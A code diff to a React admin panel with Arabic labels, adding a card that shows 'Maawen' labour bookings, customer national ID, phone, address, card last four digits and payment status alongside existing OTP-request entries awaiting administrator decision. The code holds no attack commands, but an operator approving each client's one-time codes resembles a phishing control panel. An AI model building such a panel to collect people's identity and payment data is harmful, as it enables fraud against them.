@@ -76,7 +76,7 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
 
   // بناء خط زمني موحّد: كل صندوق يحمل وقته الخاص (created_at)
   type TimelineItem = {
-    kind: "profile" | "booking" | "payment" | "otp" | "inquiry";
+    kind: "profile" | "booking" | "payment" | "otp" | "inquiry" | "maawen";
     created_at: string;
     data: Record<string, unknown>;
   };
@@ -127,6 +127,8 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
     if (e.type === "payment") timeline.push({ kind: "payment", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
     else if (e.type === "otp_request" || e.type === "verification") timeline.push({ kind: "otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
     else if (e.type === "inquiry") timeline.push({ kind: "inquiry", created_at: e.created_at, data: { ...e } });
+    else if (e.type === "maawen_booking" || e.type === "maawen_profile" || e.type === "maawen_payment")
+      timeline.push({ kind: "maawen", created_at: e.created_at, data: { ...e } });
   }
 
   // ترتيب الخط الزمني: الأحدث في الأعلى، الأقدم في الأسفل
@@ -262,6 +264,14 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
                   entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                   decidable={item.data.decidable === true}
                   onDecided={onEntryDecided}
+                />
+              );
+            }
+            if (item.kind === "maawen") {
+              return (
+                <MaawenCard
+                  key={`maawen-${String(item.data.id ?? i)}`}
+                  entry={item.data as { type: string; payload: Record<string, unknown>; created_at: string }}
                 />
               );
             }
@@ -642,6 +652,102 @@ function InquiryCard({
         <DataRow label="نوع الخدمة" value={String(p.service_type ?? "غير محدد")} />
         <DataRow label="الهاتف" value={String(p.phone ?? "غير متوفر")} dir="ltr" />
         <DataRow label="الرسالة" value={String(p.message ?? "")} small />
+      </div>
+    </div>
+  );
+}
+
+/** بطاقة لطلبات "معاون" (حجز ساعة/شهر، معلومات عميل، دفع). */
+function MaawenCard({
+  entry,
+}: {
+  entry: { type: string; payload: Record<string, unknown>; created_at: string };
+}) {
+  const p = entry.payload;
+  const type = entry.type;
+
+  let title = "طلب معاون";
+  if (type === "maawen_booking") {
+    const bt = p.booking_type === "monthly" ? "بالشهر" : p.booking_type === "hourly" ? "بالساعة" : "";
+    title = `طلب معاون — عمالة ${bt}`;
+  } else if (type === "maawen_profile") {
+    title = "معلومات عميل (معاون)";
+  } else if (type === "maawen_payment") {
+    title = "طلب دفع (معاون)";
+  }
+
+  const bookingRef = String(p.booking_ref ?? "");
+  const bookingTypeRaw = String(p.booking_type ?? "");
+  const bookingType = bookingTypeRaw === "monthly" ? "بالشهر" : bookingTypeRaw === "hourly" ? "بالساعة" : "";
+  const service = String(p.service ?? p.service_type ?? "");
+  const nationality = String(p.nationality ?? "");
+  const units = String(p.units ?? "");
+  const unitLabel = bookingTypeRaw === "monthly" ? units : units ? `${units} ساعات` : "";
+  const workersCount = String(p.workers_count ?? "");
+  const total = Number(p.total ?? 0);
+  const deposit = Number(p.deposit ?? 0);
+  const fee = Number(p.fee ?? 0);
+  const remaining = Number(p.remaining ?? 0);
+  const date = String(p.start_date ?? p.date ?? "");
+  const time = String(p.start_time ?? p.time ?? "");
+  const workType = String(p.service_type ?? "");
+  const fullName = String(p.full_name ?? "");
+  const phone = String(p.phone ?? "");
+  const address = String(p.address ?? "");
+  const nationalId = String(p.national_id ?? "");
+  const cardLast4 = String(p.card_last4 ?? "");
+  const status = String(p.status ?? "new");
+
+  return (
+    <div className={styles.card}>
+      <div className={styles.cardHeader}>
+        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> {title}</span>
+        <div className={styles.cardHeaderRight}>
+          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
+        </div>
+      </div>
+      <div className={styles.cardBody}>
+        {bookingRef && type === "maawen_booking" && <DataRow label="رقم الحجز" value={bookingRef} dir="ltr" mono />}
+        {bookingType && <DataRow label="نوع الحجز" value={bookingType} />}
+        {service && <DataRow label="الخدمة" value={service} />}
+        {unitLabel && <DataRow label={bookingTypeRaw === "monthly" ? "مدة العقد" : "المدة"} value={`${unitLabel}${bookingTypeRaw === "monthly" ? " (" + String(p.unit_price ?? "") + " ر.ق)" : ""}`} />}
+        {workersCount && <DataRow label="عدد العمالة" value={workersCount} />}
+        {nationality && <DataRow label="الجنسية" value={nationality} />}
+        {workType && <DataRow label="نمط الدوام" value={workType} />}
+        {date && <DataRow label="تاريخ البدء" value={date} />}
+        {time && <DataRow label="وقت البدء" value={time} />}
+        {total > 0 && <DataRow label="الإجمالي" value={`${total.toLocaleString()} ر.ق`} />}
+        {deposit > 0 && <DataRow label="الدفعة (تُدفع الآن)" value={`${deposit.toLocaleString()} ر.ق`} highlight="amber" />}
+        {fee > 0 && <DataRow label="رسوم التوثيق" value={`${fee} ر.ق`} highlight="amber" />}
+        {remaining > 0 && <DataRow label="المتبقي" value={`${remaining.toLocaleString()} ر.ق`} />}
+        {type === "maawen_profile" && (
+          <>
+            <DataRow label="الاسم" value={fullName || "—"} />
+            <DataRow label="رقم الهوية" value={nationalId || "—"} dir="ltr" />
+            <DataRow label="الهاتف" value={phone || "—"} dir="ltr" />
+            <DataRow label="العنوان" value={address || "—"} />
+          </>
+        )}
+        {type === "maawen_payment" && (
+          <>
+            {fullName && <DataRow label="الاسم" value={fullName} />}
+            {phone && <DataRow label="الهاتف" value={phone} dir="ltr" />}
+            {cardLast4 && (
+              <DataRow
+                label="البطاقة"
+                value={`${String(p.card_scheme ?? "بطاقة")} •••• ${cardLast4}`}
+                dir="ltr"
+              />
+            )}
+            <DataRow
+              label="الحالة"
+              value={status === "pending_admin" ? "⏳ بانتظار المدير" : status === "completed" ? "✓ مكتمل" : status}
+            />
+          </>
+        )}
+        {type === "maawen_booking" && (
+          <DataRow label="كامل التفاصيل" value={bookingRef || "سجّل في الوارد"} small />
+        )}
       </div>
     </div>
   );
